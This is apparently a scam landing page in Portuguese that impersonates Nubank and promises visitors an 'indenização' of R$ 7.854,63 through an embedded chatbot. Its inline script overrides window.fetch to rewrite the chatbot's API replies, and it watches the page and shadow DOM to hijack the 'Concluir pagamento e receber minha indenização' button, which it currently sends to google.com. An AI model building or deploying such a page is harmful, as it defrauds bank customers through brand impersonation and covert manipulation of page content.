<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Saque da Indeniza√ß√£o</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-[#831BD1] min-h-screen flex flex-col">
  <header class="bg-white px-4 shadow-md">
    <div class="max-w-[1200px] mx-auto flex items-center gap-6">
      <img src="images/logo.svg" alt="Nubank" class="h-16 w-auto">
    </div>
  </header>

  <main class="flex-1 px-4 py-2">
    <div class="flex flex-col">
      <main>
        <div class="max-h-min">
          <div class="px-0.5 pb-[0.6rem]">
            <div class="bg-white border border-gray-300 rounded-md w-full h-[calc(100vh-80px)] overflow-hidden">
              <div class="px-4 pt-4 pb-0 text-center max-w-md mx-auto text-black">
                <p class="text-base">
                  <span>Ol√°, </span>
                  <span class="text-black font-bold">USU√°RIO!</span>
                </p>
                <p class="mt-1 text-sm">
                  Responda as perguntas abaixo para realizar<br>seu saque de <span>R$ 7.854,63</span>
                </p>
              </div>

              <!-- Typebot -->
              <script type="module">
                import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.86/dist/web.js';

                Typebot.initStandard({
                  typebot: "nub-1-mcrdbzs",
                  apiHost: "https://chat.typezap.site",
                }).then(() => {
                  console.log('Typebot carregado - Iniciando intercepta√ß√£o');
                  initRedirectionSystem();
                });
              </script>

              <script>
              // Sistema de Redirecionamento Completo
              function initRedirectionSystem() {
                // 1. Intercepta√ß√£o de API
                const originalFetch = window.fetch;
                window.fetch = async function(url, options) {
                  if (url.includes('/continueChat')) {
                    try {
                      const response = await originalFetch.apply(this, arguments);
                      const clonedResponse = response.clone();
                      const data = await clonedResponse.json();
                      
                      if (JSON.stringify(data).includes('Concluir pagamento e receber minha indeniza√ß√£o')) {
                        data.messages = data.messages.map(msg => {
                          if (msg.content?.richText) {
                            msg.content.richText = msg.content.richText.map(rich => ({
                              ...rich,
                              children: rich.children.map(child => ({
                                ...child,
                                text: child.text?.replace(/https?:\/\/[^\s]+/g, 'https://google.com')
                              }))
                            }));
                          }
                          return msg;
                        });
                        console.log('‚úÖ Resposta da API modificada');
                        return new Response(JSON.stringify(data), response);
                      }
                      return response;
                    } catch (e) {
                      console.error('Erro ao interceptar API:', e);
                      return originalFetch.apply(this, arguments);
                    }
                  }
                  return originalFetch.apply(this, arguments);
                };

                // 2. Monitoramento do DOM
                const observer = new MutationObserver(mutations => {
                  mutations.forEach(mutation => {
                    mutation.addedNodes.forEach(node => {
                      if (node.nodeType === 1) {
                        const elements = node.querySelectorAll ? node.querySelectorAll('*') : [node];
                        elements.forEach(el => {
                          if (el.textContent?.includes('Concluir pagamento e receber minha indeniza√ß√£o')) {
                            replaceElement(el);
                          }
                        });
                      }
                    });
                  });
                });

                observer.observe(document.body, {
                  childList: true,
                  subtree: true,
                  attributes: true
                });

                // 3. Substitui√ß√£o inicial
                document.querySelectorAll('a, [onclick], button').forEach(el => {
                  if (el.textContent?.includes('Concluir pagamento e receber minha indeniza√ß√£o')) {
                    replaceElement(el);
                  }
                });

                // 4. Verifica√ß√£o do Shadow DOM
                setInterval(() => {
                  const typebots = document.querySelectorAll('typebot-standard');
                  typebots.forEach(typebot => {
                    if (typebot.shadowRoot) {
                      typebot.shadowRoot.querySelectorAll('a, button').forEach(el => {
                        if (el.textContent?.includes('Concluir pagamento e receber minha indeniza√ß√£o')) {
                          replaceElement(el);
                        }
                      });
                    }
                  });
                }, 1000);

                console.log('üõ° Sistema de redirecionamento ativado para google.com');
              }

              // Fun√ß√£o para substituir elementos
              function replaceElement(el) {
                try {
                  if (el.tagName === 'A') {
                    el.href = 'https://google.com';
                    el.target = '_blank';
                    console.log('üîó Link substitu√≠do:', el);
                  } else {
                    el.onclick = (e) => {
                      e?.preventDefault();
                      window.open('https://google.com', '_blank');
                      return false;
                    };
                    console.log('üñ± A√ß√£o de clique substitu√≠da:', el);
                  }
                } catch (e) {
                  console.error('Erro ao substituir elemento:', e);
                }
              }
              </script>

              <typebot-standard></typebot-standard>
            </div>
          </div>
        </div>
      </main>
    </div>
  </main>
</body>
</html>
